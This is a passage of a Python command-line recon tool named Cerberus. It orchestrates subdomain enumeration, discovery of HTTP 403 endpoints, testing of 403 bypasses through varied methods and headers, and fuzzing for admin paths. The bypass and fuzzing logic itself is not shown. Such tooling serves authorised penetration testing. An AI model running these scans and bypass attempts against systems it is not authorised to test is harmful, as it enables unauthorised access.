        found_403s = scan_403_endpoints(subdomain, wordlist_files, 10)
        all_found_403s.extend(found_403s)
        print(Fore.GREEN + f"Found {len(found_403s)} 403 endpoints for {subdomain}")

    # Save results
    with open(outfile, 'w') as f:
        for endpoint in all_found_403s:
            f.write(f"{endpoint}\n")

    print(Fore.GREEN + f"\n[✓] Total 403 endpoints found: {len(all_found_403s)}")
    print(Fore.GREEN + f"[✓] Endpoints saved to {outfile}\n")

def bypass_test(args):
    """Test comprehensive 403 bypass techniques on endpoints"""
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'bypass_results.txt')
    print(Fore.GREEN + f"[+] Testing 403 bypasses on endpoints from {args.endpoints_file}...\n")

    bypasses = bypass_403_endpoints(args.endpoints_file, 5)

    # Save results
    with open(outfile, 'w') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"# 403 Bypass Test Results - {timestamp}\n")
        f.write(f"# Total bypasses found: {len(bypasses)}\n\n")

        for bypass in bypasses:
            f.write(f"URL: {bypass['url']}\n")
            f.write(f"Method: {bypass['method']}\n")
            f.write(f"Status: {bypass['status_code']}\n")
            if bypass['headers']:
                headers_str = ', '.join([f"{k}: {v}" for k, v in bypass['headers'].items()])
                f.write(f"Headers: {headers_str}\n")
            f.write("-" * 50 + "\n")

    print(Fore.GREEN + f"\n[✓] Total bypasses found: {len(bypasses)}")
    print(Fore.GREEN + f"[✓] Results saved to {outfile}\n")

def admin_fuzz(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'admin_fuzz_results.txt')

    # Handle both single subdomain and file with multiple subdomains
    if is_domain(args.subdomain):
        subdomains = [args.subdomain]
        print(Fore.GREEN + f"[+] Fuzzing admin paths on {args.subdomain}...\n")
    else:
        # It's a file
        try:
            with open(args.subdomain, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Fuzzing admin paths on {len(subdomains)} subdomains from {args.subdomain}...\n")
            print(Fore.CYAN + f"First 3 subdomains: {subdomains[:3]}")
        except FileNotFoundError:
            print(Fore.RED + f"[✗] File not found: {args.subdomain}")
            return

    # Get all wordlist files from directory
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return

    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return

    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")

    all_found_endpoints = []

    # Fuzz each subdomain
    for i, subdomain in enumerate(subdomains, 1):
        print(Fore.YELLOW + f"\n[{i}/{len(subdomains)}] Fuzzing {subdomain}")
        found_endpoints = fuzz_admin_paths(subdomain, wordlist_files, 10)
        all_found_endpoints.extend(found_endpoints)
        print(Fore.GREEN + f"Found {len(found_endpoints)} admin endpoints for {subdomain}")

    # Save results
    with open(outfile, 'w') as f:
        for endpoint in all_found_endpoints:
            f.write(f"{endpoint}\n")

    print(Fore.GREEN + f"\n[✓] Total admin endpoints found: {len(all_found_endpoints)}")
    print(Fore.GREEN + f"[✓] Results saved to {outfile}\n")

# Main CLI

def main():
    parser = argparse.ArgumentParser(
        description="Cerberus: Gateway Guardian Recon Pipeline Tool"
    )
    parser.add_argument('--output-dir', '-O', default='outputs', help='Directory for all output files')
    parser.add_argument('--version', action='version', version='Cerberus 1.0.1')
    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # enum
    p = subparsers.add_parser('enum', help='Enumerate subdomains')
    p.add_argument('domain', help='Base domain (e.g., example.com)')
    p.add_argument('-o', '--output', help='Filename for subdomains')
    p.set_defaults(func=enum_subdomains)

    # filter
    p = subparsers.add_parser('filter', help='Filter wildcard DNS from subs')
    p.add_argument('domain', help='Base domain')
    p.add_argument('wordlist', help='Wordlist (txt)')
    p.add_argument('subs_file', help='Raw subdomains file')
    p.add_argument('-o', '--output', help='Filename for filtered subs')
    p.set_defaults(func=filter_wildcard)

    # subscan
    p = subparsers.add_parser('subscan', help='Find sub-subdomains')
    p.add_argument('subs_file', help='Base subdomains file')
    p.add_argument('wordlist_dir', help='Dir of .txt wordlists')
    p.add_argument('-t', '--threads', type=int, default=DEFAULT_THREADS, help='Max DNS threads')
    p.add_argument('-o', '--output', help='Filename for sub-subdomains')
    p.set_defaults(func=subscan)

    # wordscan
    p = subparsers.add_parser('wordscan', help='Wordlist scan on subdomain')
    p.add_argument('subdomain', help='Single subdomain')
    p.add_argument('wordlist_dir', help='Dir of .txt wordlists')
    p.set_defaults(func=wordscan)

    # identify403
    p = subparsers.add_parser('identify403', help='Discover 403 endpoints')
    p.add_argument('subdomain', help='Single subdomain or file with subdomains')
    p.add_argument('wordlist_dir', help='Dir of endpoint wordlists')
    p.add_argument('-o', '--output', help='Filename for endpoints list')
    p.set_defaults(func=identify_403)

    # bypass
    p = subparsers.add_parser('bypass', help='Test CORS/bypass on 403s')
    p.add_argument('endpoints_file', help='File listing 403 endpoints')
    p.add_argument('-o', '--output', help='Filename for bypass results')
    p.set_defaults(func=bypass_test)

    # adminfuzz
    p = subparsers.add_parser('adminfuzz', help='Fuzz admin paths')
    p.add_argument('subdomain', help='Single subdomain or file with subdomains')
    p.add_argument('wordlist_dir', help='Dir of .txt wordlists')
    p.add_argument('-o', '--output', help='Filename for admin fuzz results')
    p.set_defaults(func=admin_fuzz)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)
    args.func(args)

if __name__ == '__main__':
    main()

